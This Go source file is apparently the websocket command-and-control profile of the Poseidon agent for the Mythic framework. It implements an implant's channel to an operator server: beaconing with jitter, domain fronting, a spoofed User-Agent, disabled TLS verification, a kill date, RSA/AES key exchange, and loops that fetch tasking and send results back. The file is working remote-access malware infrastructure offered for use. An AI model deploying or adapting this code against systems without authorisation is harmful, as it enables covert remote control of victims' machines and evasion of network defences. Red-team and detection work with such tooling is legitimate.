//go:build (linux || darwin) && websocket
// +build linux darwin
// +build websocket

package profiles

import (
	"crypto/rsa"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	// 3rd Party

	"github.com/gorilla/websocket"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Websocket C2 profile variables from https://github.com/MythicC2Profiles/websocket/blob/master/C2_Profiles/websocket/mythic/c2_functions/websocket.py
// All variables must be a string so they can be set with ldflags

// callback_host is used to create the BaseURL value in the Websocket C2 profile
var websocket_callback_host string

// callback_port is used to create the BaseURL value in the Websocket C2 profile
var websocket_callback_port string

// USER_AGENT is the HTTP User-Agent header value
var websocket_USER_AGENT string

// AESPSK is Base64 of a 32B AES Key
var websocket_AESPSK string

// callback_interval is the callback interval in seconds
var websocket_callback_interval string

// encrypted_exchange_check is set to True or False to determine if Poseidon should do a key exchange
var websocket_encrypted_exchange_check string

// domain_front the Host header value for domain fronting
var websocket_domain_front string

// ENDPOINT_REPLACE is the websockets endpoint
var websocket_ENDPOINT_REPLACE string

// callback_jitter is the callback jitter in percent
var websocket_callback_jitter string

var websocket_tasking_type string

// killdate is the Killdate
var websocket_killdate string

const TaskingTypePush = "Push"
const TaskingTypePoll = "Poll"

type C2Websockets struct {
	HostHeader      string `json:"HostHeader"`
	BaseURL         string `json:"BaseURL"`
	Interval        int    `json:"Interval"`
	Jitter          int    `json:"Jitter"`
	ExchangingKeys  bool   `json:"-"`
	UserAgent       string `json:"UserAgent"`
	Key             string `json:"EncryptionKey"`
	RsaPrivateKey   *rsa.PrivateKey
	PollConn        *websocket.Conn `json:"-"`
	PushConn        *websocket.Conn `json:"-"`
	Lock            sync.RWMutex    `json:"-"`
	ReconnectLock   sync.RWMutex    `json:"-"`
	Endpoint        string          `json:"Websocket URL Endpoint"`
	TaskingType     string          `json:"TaskingType"`
	Killdate        time.Time       `json:"KillDate"`
	FinishedStaging bool
	ShouldStop      bool
	stoppedChannel  chan bool
	PushChannel     chan structs.MythicMessage `json:"-"`
}

var websocketDialer = websocket.Dialer{
	TLSClientConfig: &tls.Config{
		InsecureSkipVerify: true,
	},
}

// New creates a new HTTP C2 profile from the package's global variables and returns it
func init() {
	var finalUrl string
	var lastSlash int
	if websocket_callback_port == "443" && strings.Contains(websocket_callback_host, "wss://") {
		finalUrl = websocket_callback_host
	} else if websocket_callback_port == "80" && strings.Contains(websocket_callback_host, "ws://") {
		finalUrl = websocket_callback_host
	} else {
		lastSlash = strings.Index(websocket_callback_host[8:], "/")
		if lastSlash == -1 {
			//there is no 3rd slash
			finalUrl = fmt.Sprintf("%s:%s", websocket_callback_host, websocket_callback_port)
		} else {
			//there is a 3rd slash, so we need to splice in the port
			lastSlash += 8 // adjust this back to include our offset initially
			//fmt.Printf("index of last slash: %d\n", last_slash)
			//fmt.Printf("splitting into %s and %s\n", string(callback_host[0:last_slash]), string(callback_host[last_slash:]))
			finalUrl = fmt.Sprintf("%s:%s%s", string(websocket_callback_host[0:lastSlash]), websocket_callback_port, string(websocket_callback_host[lastSlash:]))
		}
	}
	if finalUrl[len(finalUrl)-1:] != "/" {
		finalUrl = finalUrl + "/"
	}
	profile := C2Websockets{
		HostHeader:     websocket_domain_front,
		BaseURL:        finalUrl,
		UserAgent:      websocket_USER_AGENT,
		Key:            websocket_AESPSK,
		Endpoint:       websocket_ENDPOINT_REPLACE,
		ShouldStop:     true,
		stoppedChannel: make(chan bool, 1),
		PushChannel:    make(chan structs.MythicMessage, 100),
		PollConn:       nil,
		PushConn:       nil,
	}

	// Convert sleep from string to integer
	i, err := strconv.Atoi(websocket_callback_interval)
	if err == nil {
		profile.Interval = i
	} else {
		profile.Interval = 10
	}

	// Convert jitter from string to integer
	j, err := strconv.Atoi(websocket_callback_jitter)
	if err == nil {
		profile.Jitter = j
	} else {
		profile.Jitter = 23
	}

	if websocket_encrypted_exchange_check == "true" {
		profile.ExchangingKeys = true
	}

	if len(profile.UserAgent) <= 0 {
		profile.UserAgent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
	}

	if websocket_tasking_type == "" || websocket_tasking_type == "Poll" {
		profile.TaskingType = "Poll"
	} else {
		profile.TaskingType = "Push"
	}
	killDateString := fmt.Sprintf("%sT00:00:00.000Z", websocket_killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		os.Exit(1)
	}
	profile.Killdate = killDateTime
	AddAvailableProfile(&profile)
	go profile.CreateMessagesForEgressConnections()
}
func (c *C2Websockets) CheckForKillDate() {
	for true {
		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
			return
		}
		time.Sleep(time.Duration(60) * time.Second)
		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		}
	}
}
func (c *C2Websockets) IsP2P() bool {
	return false
}
func (c *C2Websockets) IsRunning() bool {
	return !c.ShouldStop
}
func (c *C2Websockets) Start() {
	// Checkin with Mythic via an egress channel
	// only try to start if we're in a stopped state
	if !c.ShouldStop {
		return
	}
	c.ShouldStop = false
	if c.TaskingType == TaskingTypePoll {
		defer func() {
			c.PollConn.Close()
			c.PollConn = nil
			c.stoppedChannel <- true
		}()
		for {
			if c.ShouldStop || c.TaskingType == TaskingTypePush {
				PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling Start before checking in\n"))
				return
			}
			checkIn := c.CheckIn()
			// If we successfully checkin, get our new ID and start looping
			if strings.Contains(checkIn.Status, "success") {
				SetMythicID(checkIn.ID)
				break
			} else {
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
				continue
			}
		}
		for {
			if c.ShouldStop || c.TaskingType == TaskingTypePush {
				PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling Start after checking in\n"))
				return
			}
			// loop through all task responses
			message := CreateMythicPollMessage()
			encResponse, _ := json.Marshal(message)
			//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
			// send a message out to Mythic
			resp := c.SendMessage(encResponse)
			if len(resp) > 0 {
				//fmt.Printf("Raw resp: \n %s\n", string(resp))
				taskResp := structs.MythicMessageResponse{}
				err := json.Unmarshal(resp, &taskResp)
				if err != nil {
					PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
					continue
				}
				// async handle the response back
				HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
			}
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
		}
	} else {
		go c.CheckForKillDate()
		//go c.CreateMessagesForEgressConnections()
		c.getData()
	}
}
func (c *C2Websockets) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true
	// might be blocking at a read, so close the appropriate connection
	if c.TaskingType == TaskingTypePush {
		if c.PushConn != nil {
			c.PushConn.Close()
		}

	} else {
		if c.PollConn != nil {
			c.PollConn.Close()
		}

	}
	PrintDebug(fmt.Sprintf("issued stop to websocket\n"))
	<-c.stoppedChannel
	PrintDebug(fmt.Sprintf("websocket fully stopped\n"))
}
func (c *C2Websockets) UpdateConfig(parameter string, value string) {
	changingConnectionParameter := false
	changingConnectionType := parameter == "TaskingType" && c.TaskingType != value
	switch parameter {
	case "HostHeader":
		c.HostHeader = value
		changingConnectionParameter = true
	case "BaseURL":
		c.BaseURL = value
		changingConnectionParameter = true
	case "Interval":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Interval = newInt
		}
	case "Jitter":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Jitter = newInt
		}
	case "UserAgent":
		c.UserAgent = value
		changingConnectionParameter = true
	case "EncryptionKey":
		c.Key = value
	case "Endpoint":
		c.Endpoint = value
	case "Killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
		if err == nil {
			c.Killdate = killDateTime
		}
	case "TaskingType":
		c.Stop()
		changingConnectionParameter = true
		if value == TaskingTypePush {
			c.TaskingType = TaskingTypePush
		} else if value == TaskingTypePoll {
			c.TaskingType = TaskingTypePoll
		}
	}
	if changingConnectionParameter {
		// disconnect and reconnect for the new connection parameter values
		if !changingConnectionType {
			c.Stop()
		}
		go c.Start()
		if changingConnectionType {
			// if we're changing between push/poll let mythic know to refresh
			P2PConnectionMessageChannel <- structs.P2PConnectionMessage{
				Source:        GetMythicID(),
				Destination:   GetMythicID(),
				Action:        "remove",
				C2ProfileName: "websocket",
			}
		}
	}
}
func (c *C2Websockets) GetPushChannel() chan structs.MythicMessage {
	if c.TaskingType == TaskingTypePush && !c.ShouldStop {
		return c.PushChannel
	}
	return nil
}

// CreateMessagesForEgressConnections is responsible for checking if we have messages to send
// and sends them out to Mythic
func (c *C2Websockets) CreateMessagesForEgressConnections() {
	// got a message that needs to go to one of the c.ExternalConnection
	for {
		msg := <-c.PushChannel
		raw, err := json.Marshal(msg)
		if err != nil {
			PrintDebug(fmt.Sprintf("Failed to marshal message to Mythic: %v\n", err))
			continue
		}
		//fmt.Printf("Sending message outbound to websocket: %v\n", msg)
		c.SendMessage(raw)
	}
}

func (c *C2Websockets) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	if c.TaskingType == TaskingTypePush {
		return 0
	}
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}
func (c *C2Websockets) SetSleepInterval(interval int) string {
	if c.TaskingType == TaskingTypePush {
		return fmt.Sprintf("Sleep interval not used for Push style C2 Profile\n")
	}
	if interval >= 0 {
		c.Interval = interval
		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
	} else {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}

}
func (c *C2Websockets) SetSleepJitter(jitter int) string {
	if c.TaskingType == TaskingTypePush {
		return fmt.Sprintf("Jitter interval not used for Push style C2 Profile\n")
	}
	if jitter >= 0 && jitter <= 100 {
		c.Jitter = jitter
		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
	} else {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
}
func (c *C2Websockets) ProfileName() string {
	return "websocket"
}
func (c *C2Websockets) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}
func (c *C2Websockets) CheckIn() structs.CheckInMessageResponse {
	checkin := CreateCheckinMessage()
	checkinMsg, err := json.Marshal(checkin)
	if err != nil {
		PrintDebug(fmt.Sprintf("error trying to marshal checkin data\n"))
	}
	for {
		if c.ShouldStop {
			PrintDebug(fmt.Sprintf("got c.ShouldStop in checkin\n"))
			return structs.CheckInMessageResponse{}
		}
		if c.ExchangingKeys {
			//fmt.Printf("exchanging keys is true in Checkin\n")
			for !c.NegotiateKey() {
				PrintDebug(fmt.Sprintf("failed to negotiate key, trying again\n"))
				if c.ShouldStop {
					PrintDebug(fmt.Sprintf("got c.ShouldStop while negotiateKey\n"))
					return structs.CheckInMessageResponse{}
				}
			}
		}
		resp := c.SendMessage(checkinMsg)
		if c.TaskingType == TaskingTypePush {
			return structs.CheckInMessageResponse{}
		}
		response := structs.CheckInMessageResponse{}
		err := json.Unmarshal(resp, &response)
		if err != nil {
			PrintDebug(fmt.Sprintf("Error unmarshaling checkin response: %s", err.Error()))
			return structs.CheckInMessageResponse{Status: "failed"}
		}

		if len(response.ID) > 0 {
			// only continue on if we actually get an ID
			SetMythicID(response.ID)
			c.ExchangingKeys = false
			c.FinishedStaging = true
			return response
		}
	}

}

// SendMessage wraps SendData but adds a Lock so that we only send one message at a time over the websocket
func (c *C2Websockets) SendMessage(output []byte) []byte {
	// since we're using a single websocket stream, only send one message at a time
	if c.ShouldStop {
		PrintDebug(fmt.Sprintf("got c.ShouldStop in sendMessage\n"))
		return nil
	}
	//fmt.Printf("sending to Mythic: %v\n", string(output))
	c.Lock.Lock()
	defer c.Lock.Unlock()
	if c.TaskingType == TaskingTypePoll {
		return c.sendData(output)
	} else {
		c.sendDataNoResponse(output)
		//fmt.Printf("sent push data to mythic\n")
		return nil
	}
}
func (c *C2Websockets) NegotiateKey() bool {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	//initMessage := structs.EKEInit{}
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)

	if err != nil {
		PrintDebug(fmt.Sprintf("Error marshaling data: %s", err.Error()))
		return false
	}
	resp := c.SendMessage(raw)
	if c.TaskingType == TaskingTypePush {
		return true
	}
	//decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaPrivateKey)
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		PrintDebug(fmt.Sprintf("Error unmarshaling RsaResponse %s", err.Error()))
		return false
	}

	//log.Printf("Received EKE response: %+v\n", sessionKeyResp)
	// Save the new AES session key
	encryptedSesionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSesionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false
	c.FinishedStaging = true
	SetAllEncryptionKeys(c.Key)
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID)
	} else {
		return false
	}
	return true
}
func (c *C2Websockets) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.ExchangingKeys = false
}
func (c *C2Websockets) FinishNegotiateKey(resp []byte) bool {
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err := json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
		return false
	}
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}
	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false
	SetAllEncryptionKeys(c.Key)
	return true
}
func (c *C2Websockets) reconnect() {
	if c.ShouldStop {
		PrintDebug(fmt.Sprintf("got c.ShouldStop in reconnect\n"))
		return
	}
	c.ReconnectLock.Lock()
	defer c.ReconnectLock.Unlock()
	if c.TaskingType == TaskingTypePoll {
		if c.PollConn != nil {
			c.PollConn.Close()
		}
	} else if c.TaskingType == TaskingTypePush {
		if c.PushConn != nil {
			c.PushConn.Close()
		}
	} else {
		PrintDebug(fmt.Sprintf("Unknown tasking type, returning"))
		return
	}

	header := make(http.Header)
	header.Set("User-Agent", c.UserAgent)
	if len(c.HostHeader) > 0 {
		header.Set("Host", c.HostHeader)
	}
	if c.TaskingType == TaskingTypePush {
		header.Set("Accept-Type", "Push")
	}
	url := fmt.Sprintf("%s%s", c.BaseURL, c.Endpoint)
	for true {
		if c.ShouldStop {
			PrintDebug(fmt.Sprintf("got c.ShouldStop in reconnect loop\n"))
			return
		}

		connection, _, err := websocketDialer.Dial(url, header)
		if err != nil {
			PrintDebug(fmt.Sprintf("Error connecting to server %s ", err.Error()))
			if c.TaskingType == TaskingTypePush {
				if c.ShouldStop {
					return
				}
				time.Sleep(1 * time.Second)
			} else {
				if c.ShouldStop {
					return
				}
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			}
			continue
		}
		PrintDebug(fmt.Sprintf("Successfully reconnected to server: %s\n", c.TaskingType))
		IncrementFailedConnection(c.ProfileName())
		if c.TaskingType == TaskingTypePoll {
			c.PollConn = connection
		} else if c.TaskingType == TaskingTypePush {
			c.PushConn = connection
		}
		break
	}
	if c.TaskingType == TaskingTypePush {
		if c.FinishedStaging {
			//fmt.Printf("FinishedStaging, Got a new connection, sending checkin\n")
			go c.CheckIn()
		} else if c.ExchangingKeys {
			//fmt.Printf("ExchangingKeys, starting EKE\n")
			go c.NegotiateKey()
		} else {
			//fmt.Printf("Not finished staging, not exchanging keys, sending checkin\n")
			go c.CheckIn()
		}
	}
}
func (c *C2Websockets) sendData(sendData []byte) []byte {
	if c.PollConn == nil && c.TaskingType == TaskingTypePoll {
		c.reconnect()
	}
	m := structs.Message{}
	if len(c.Key) != 0 {
		sendData = c.encryptMessage(sendData)
	}

	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	} else {
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	}
	m.Data = base64.StdEncoding.EncodeToString(sendData)
	for i := 0; i < 5; i++ {
		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		}
		if c.ShouldStop || c.TaskingType == TaskingTypePush {
			PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
			return []byte{}
		}
		//log.Printf("Sending message %+v\n", m)
		err := c.PollConn.WriteJSON(m)
		if c.ShouldStop || c.TaskingType == TaskingTypePush {
			PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
			return []byte{}
		}
		if err != nil {
			PrintDebug(fmt.Sprintf("error reading from polling connection: %v", err))
			c.PollConn.Close()
			c.PollConn = nil
			continue
		}
		// Read the response
		resp := structs.Message{}
		err = c.PollConn.ReadJSON(&resp)
		if c.ShouldStop || c.TaskingType == TaskingTypePush {
			PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
			return []byte{}
		}
		if err != nil {
			PrintDebug(fmt.Sprintf("Error trying to read message %v", err.Error()))
			c.PollConn.Close()
			c.PollConn = nil
			continue
		}

		raw, err := base64.StdEncoding.DecodeString(resp.Data)
		if err != nil {
			if c.ShouldStop || c.TaskingType == TaskingTypePush {
				PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
				return []byte{}
			}
			PrintDebug(fmt.Sprintf("Error decoding base64 data: ", err.Error()))
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		if len(raw) < 36 {
			if c.ShouldStop || c.TaskingType == TaskingTypePush {
				PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
				return []byte{}
			}
			PrintDebug(fmt.Sprintf("length of data < 36"))
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		encRaw := raw[36:] // Remove the Payload UUID

		if len(c.Key) != 0 {
			//log.Printf("Decrypting data")
			encRaw = c.decryptMessage(encRaw)
			if len(encRaw) == 0 {
				// means we failed to decrypt
				if c.ShouldStop || c.TaskingType == TaskingTypePush {
					PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
					return []byte{}
				}
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
				continue
			}
		}
		return encRaw
	}
	return make([]byte, 0)
}

func (c *C2Websockets) sendDataNoResponse(sendData []byte) {

	if c.PushConn == nil && c.TaskingType == TaskingTypePush {
		c.reconnect()
	}

	m := structs.Message{}
	PrintDebug(fmt.Sprintf("about to send data to Mythic from Websocket Push\n%v\n", string(sendData)))
	if len(c.Key) != 0 {
		sendData = c.encryptMessage(sendData)
	}

	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	} else {
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	}
	m.Data = base64.StdEncoding.EncodeToString(sendData)
	for i := 0; i < 5; i++ {
		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		}
		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
			PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Pushing sendDataNoResponse\n"))

			return
		}
		//log.Printf("Sending message \n")
		err := c.PushConn.WriteJSON(m)
		if err != nil {
			PrintDebug(fmt.Sprintf("Error writing to push connection: %v", err))
			IncrementFailedConnection(c.ProfileName())
			c.PushConn.Close()
			time.Sleep(1 * time.Second)
			continue
		}
		return
	}
}

// getData is responsible for checking for new messages from Mythic
// and sending them off to get processed internally
func (c *C2Websockets) getData() {
	// These are normally formatted messages for our agent
	// in normal base64 format with our uuid, parse them as such
	defer func() {
		c.stoppedChannel <- true
	}()
	for {
		//fmt.Printf("looping to read data\n")
		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
			return
		}
		resp := structs.Message{}
		if c.PushConn == nil && c.TaskingType == TaskingTypePush {
			c.reconnect()
		}
		err := c.PushConn.ReadJSON(&resp)
		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
			return
		}
		if err != nil {
			PrintDebug(fmt.Sprintf("Error trying to read message %v", err.Error()))
			IncrementFailedConnection(c.ProfileName())
			c.reconnect()
			time.Sleep(1 * time.Second)
			continue
		}
		//log.Printf("got raw message: %s\n", resp.Data)
		raw, err := base64.StdEncoding.DecodeString(resp.Data)
		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
			return
		}
		if err != nil {
			PrintDebug(fmt.Sprintf("Error decoding base64 data: %v", err.Error()))
			IncrementFailedConnection(c.ProfileName())
			c.reconnect()
			time.Sleep(1 * time.Second)
			continue
		}
		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
			return
		}
		if len(raw) < 36 {
			PrintDebug(fmt.Sprintf("length of data < 36"))
			IncrementFailedConnection(c.ProfileName())
			c.reconnect()
			time.Sleep(1 * time.Second)
			continue
		}

		encRaw := raw[36:] // Remove the Payload UUID

		if len(c.Key) != 0 {
			//log.Printf("Decrypting data")
			encRaw = c.decryptMessage(encRaw)
			if len(encRaw) == 0 {
				// means we failed to decrypt
				if c.ShouldStop || c.TaskingType == TaskingTypePoll {
					return
				}
				IncrementFailedConnection(c.ProfileName())
				c.reconnect()
				time.Sleep(1 * time.Second)
				continue
			}
		}
		//log.Printf("got message from Mythic: %v\n", string(encRaw))
		if c.FinishedStaging {
			taskResp := structs.MythicMessageResponse{}
			err = json.Unmarshal(encRaw, &taskResp)
			if err != nil {
				PrintDebug(fmt.Sprintf("Failed to unmarshal message into MythicResponse: %v\n", err))
			}
			//fmt.Printf("Raw message from mythic: %v\n", string(enc_raw))
			HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
		} else {
			if c.ExchangingKeys {
				//fmt.Printf("exchanging keys is true in getData\n")
				// this will be our response to the initial staging message
				if c.FinishNegotiateKey(encRaw) {
					//fmt.Printf("finished negotiating key, sending checkin\n")
					c.CheckIn()
				} else {
					// we ran into some sort of issue during the staging process, so start it again
					//fmt.Printf("c.FinishNegotiateKey returned false, trying negotiate again\n")
					c.NegotiateKey()
				}
			} else {
				// should be the result of c.Checkin()
				checkinResp := structs.CheckInMessageResponse{}
				err = json.Unmarshal(encRaw, &checkinResp)
				if checkinResp.Status == "success" {
					SetMythicID(checkinResp.ID)
					c.FinishedStaging = true
					c.ExchangingKeys = false
					// once we check in successfully with Push, attempt to get any missing Poll messages
				} else {
					PrintDebug(fmt.Sprintf("Failed to checkin, got a weird message: %s\n", string(encRaw)))
				}
				PrintDebug("adding missed poll messages to push messages")
				missedMessages := CreateMythicPollMessage()
				c.PushChannel <- *missedMessages
				PrintDebug("added missed poll messages")
			}
		}
	}
}
func (c *C2Websockets) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}
func (c *C2Websockets) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
